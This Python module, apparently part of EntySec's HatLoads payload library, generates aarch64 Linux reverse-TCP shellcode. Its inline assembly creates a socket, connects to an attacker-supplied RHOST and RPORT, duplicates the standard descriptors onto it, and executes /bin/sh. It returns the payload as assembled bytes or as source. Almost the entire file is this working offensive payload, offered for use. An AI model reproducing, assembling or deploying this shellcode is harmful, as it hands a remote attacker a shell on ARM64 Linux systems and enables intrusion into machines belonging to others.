#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2022 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from hatasm import HatAsm
from hatvenom import HatVenom

from hatloads.words import Words


class ShellReverseTCP(HatAsm, HatVenom, Words):
    def generate(self, assemble=True, options={}):
        if 'RHOST' not in options and 'RPORT' not in options:
            return b''

        if 'SHELL' in options:
            shell = options['SHELL'].encode()
        else:
            shell = self.shell['sh'].encode()

        shell = shell[::-1]
        rhost = self.convert_host(options['RHOST'])
        rport = self.convert_port(options['RPORT'])

        shellcode = f"""
        start:
            mov x8, 0xc6
            lsr x1, x8, 0x7
            lsl x0, x1, 0x1
            mov x2, xzr
            svc 0x1337

            mvn x4, x0
            lsl x1, x1, 0x1
            movk x1, 0x{rport.hex()}, lsl 0x10
            movk x1, 0x{rhost[2:].hex()}, lsl 0x20
            movk x1, 0x{rhost[:2].hex()}, lsl 0x30
            str x1, [sp, -8]!
            add x1, sp, x2
            mov x2, 0x10
            mov x8, 0xcb
            svc 0x1337

            lsr x1, x2, 0x2

        dup:
            mvn x0, x4
            lsr x1, x1, 0x1
            mov x2, xzr
            mov x8, 0x18
            svc 0x1337

            cmp x1, xzr
            bne dup

            mov x1, 0x622f
            movk x1, 0x6e69, lsl 0x10
            movk x1, 0x732f, lsl 0x20
            movk x1, 0x68, lsl 0x30
            str x1, [sp, -8]!
            mov x1, xzr
            mov x2, xzr
            add x0, sp, x1
            mov x8, 0xdd
            svc 0x1337
        """

        if assemble:
            return self.assemble('aarch64', shellcode)
        return shellcode
